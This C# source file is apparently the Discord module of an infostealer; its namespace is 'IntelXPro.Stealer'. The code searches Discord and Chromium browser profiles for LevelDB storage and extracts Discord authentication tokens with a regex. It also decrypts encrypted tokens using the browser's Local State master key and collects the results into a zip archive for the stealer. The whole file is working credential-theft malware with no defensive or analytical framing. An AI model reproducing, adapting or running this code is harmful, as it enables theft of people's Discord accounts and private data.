using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Dependencies.Encryption;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Messengers
{
    internal class Discord : ITarget
    {
        private static readonly Regex _tokenRegex = new Regex("(mfa\\.[\\w-]{80,})|((MT|OD)[\\w-]{22,24}\\.[\\w-]{6}\\.[\\w-]{25,110})", RegexOptions.IgnoreCase | RegexOptions.Compiled);

        private static readonly Regex _encryptedRegex = new Regex("\"dQw4w9WgXcQ:([^\"]+)\"", RegexOptions.IgnoreCase | RegexOptions.Compiled);

        public void Collect(InMemoryZip zip, Counter counter)
        {
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Discord";
            counterApplications.Files.Add("Discord\\");
            Task task = Task.Run(delegate
            {
                Parallel.ForEach(Paths.Discord, delegate (string path)
                {
                    string text = path + "\\Local Storage\\leveldb";
                    if (Directory.Exists(text))
                    {
                        string localstate = path + "\\Local State";
                        List<string> list = TokensGrabber(text, localstate);
                        if (list.Any())
                        {
                            string browserName = Paths.GetBrowserName(path);
                            string text2 = "Discord\\" + browserName + ".txt";
                            counterApplications.Files.Add(path + " => " + text2);
                            zip.AddTextFile(text2, string.Join("\n", list));
                        }
                    }
                });
            });
            Task task2 = Task.Run(delegate
            {
                Parallel.ForEach(Paths.Chromium, delegate (string path)
                {
                    if (Directory.Exists(path))
                    {
                        Parallel.ForEach(Directory.GetDirectories(path), delegate (string profile)
                        {
                            string text = profile + "\\Local Storage\\leveldb";
                            if (Directory.Exists(text))
                            {
                                string localstate = path + "\\Local State";
                                List<string> list = TokensGrabber(text, localstate);
                                if (list.Any())
                                {
                                    string browserName = Paths.GetBrowserName(path);
                                    string text2 = "Discord\\" + browserName + " " + Path.GetFileName(profile) + ".txt";
                                    counterApplications.Files.Add(path + " => " + text2);
                                    zip.AddTextFile(text2, string.Join("\n", list));
                                }
                            }
                        });
                    }
                });
            });
            Task.WaitAll(task, task2);
            if (counterApplications.Files.Count() > 0)
            {
                counter.Messangers.Add(counterApplications);
            }
        }

        private List<string> TokensGrabber(string localstorage, string localstate)
        {
            List<string> source = SearchFiles(localstorage);
            ConcurrentBag<string> tokens = new ConcurrentBag<string>();
            ConcurrentBag<string> tokensEncrypted = new ConcurrentBag<string>();
            Parallel.ForEach(source, delegate (string localdb)
            {
                try
                {
                    string content = File.ReadAllText(localdb);
                    Parallel.ForEach(SearchToken(content), delegate (string token)
                    {
                        tokens.Add(token);
                    });
                    Parallel.ForEach(SearchEncryptedTokens(content), delegate (string token)
                    {
                        tokensEncrypted.Add(token);
                    });
                }
                catch
                {
                }
            });
            ConcurrentBag<string> distinctTokens = new ConcurrentBag<string>(tokens.Distinct());
            if (!tokensEncrypted.Any())
            {
                return distinctTokens.Distinct().ToList();
            }
            byte[] key = LocalState.MasterKeyV10(localstate);
            if (key == null)
            {
                return distinctTokens.Distinct().ToList();
            }
            Parallel.ForEach(tokensEncrypted.Distinct(), delegate (string encrypted)
            {
                try
                {
                    byte[] array = AesGcm.DecryptBrowser(Convert.FromBase64String(encrypted), key, null, checkprefix: false);
                    if (array != null)
                    {
                        distinctTokens.Add(Encoding.UTF8.GetString(array).Trim());
                    }
                }
                catch
                {
                }
            });
            return distinctTokens.Distinct().ToList();
        }

        private List<string> SearchFiles(string path)
        {
            ConcurrentBag<string> locals = new ConcurrentBag<string>();
            string[] allowedExtensions = new string[3] { ".log", ".ldb", ".sqlite" };
            Parallel.ForEach(Directory.GetFiles(path), delegate (string file)
            {
                if (allowedExtensions.Contains(Path.GetExtension(file)))
                {
                    locals.Add(file);
                }
            });
            return locals.ToList();
        }

        private List<string> ExtractMatches(string content, Regex regex)
        {
            HashSet<string> hashSet = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            foreach (Match item in regex.Matches(content))
            {
                string value = item.Groups[1].Value;
                if (!string.IsNullOrWhiteSpace(value))
                {
                    hashSet.Add(value);
                }
            }
            return hashSet.ToList();
        }

        private List<string> SearchToken(string content)
        {
            return ExtractMatches(content, _tokenRegex);
        }

        private List<string> SearchEncryptedTokens(string content)
        {
            return ExtractMatches(content, _encryptedRegex);
        }
    }
}
